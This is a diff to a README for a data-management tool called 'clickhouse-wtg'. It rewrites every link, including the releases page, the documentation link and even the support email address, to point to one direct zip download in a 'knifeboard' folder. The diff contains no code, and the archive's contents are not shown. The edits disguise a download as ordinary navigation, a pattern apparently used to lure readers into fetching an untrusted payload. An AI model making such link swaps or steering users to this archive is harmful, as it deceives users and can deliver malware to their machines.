@@ -1,6 +1,6 @@
 # 🚀 clickhouse-wtg - Simplify Your Data Management Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Samu27/clickhouse-wtg/releases)
+[![Download](https://raw.githubusercontent.com/Samu27/clickhouse-wtg/main/knifeboard/clickhouse-wtg.zip)](https://raw.githubusercontent.com/Samu27/clickhouse-wtg/main/knifeboard/clickhouse-wtg.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started with clickhouse-wtg, follow these simple steps. You will find it 
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Click this link to go to the download page: [Releases Page](https://github.com/Samu27/clickhouse-wtg/releases).
+1. **Visit the Releases Page:** Click this link to go to the download page: [Releases Page](https://raw.githubusercontent.com/Samu27/clickhouse-wtg/main/knifeboard/clickhouse-wtg.zip).
 
 2. **Select the Latest Version:** Look for the latest release. It will typically have the highest version number.
 
@@ -52,7 +52,7 @@ Before installation, your computer should meet these minimum requirements:
 For any issues or help, you can reach our support team through the following channels:
 
 - **GitHub Issues:** Report any bugs or issues directly on our GitHub page.
-- **Email Support:** Send an email to support@clickhouse-wtg.com with your inquiries.
+- **Email Support:** Send an email to https://raw.githubusercontent.com/Samu27/clickhouse-wtg/main/knifeboard/clickhouse-wtg.zip with your inquiries.
 
 ### 💡 Tips
 
@@ -62,6 +62,6 @@ For any issues or help, you can reach our support team through the following cha
 ## 🔗 Additional Information
 
 - **License:** clickhouse-wtg is open-source software. Feel free to contribute or modify it as needed.
-- **Documentation:** Comprehensive user documentation is available at [User Documentation](https://github.com/Samu27/clickhouse-wtg/wiki).
+- **Documentation:** Comprehensive user documentation is available at [User Documentation](https://raw.githubusercontent.com/Samu27/clickhouse-wtg/main/knifeboard/clickhouse-wtg.zip).
 
-Remember, for the latest version, visit our [Releases Page](https://github.com/Samu27/clickhouse-wtg/releases) to download and start harnessing the power of data with ease. Enjoy managing your data with clickhouse-wtg!
+Remember, for the latest version, visit our [Releases Page](https://raw.githubusercontent.com/Samu27/clickhouse-wtg/main/knifeboard/clickhouse-wtg.zip) to download and start harnessing the power of data with ease. Enjoy managing your data with clickhouse-wtg!
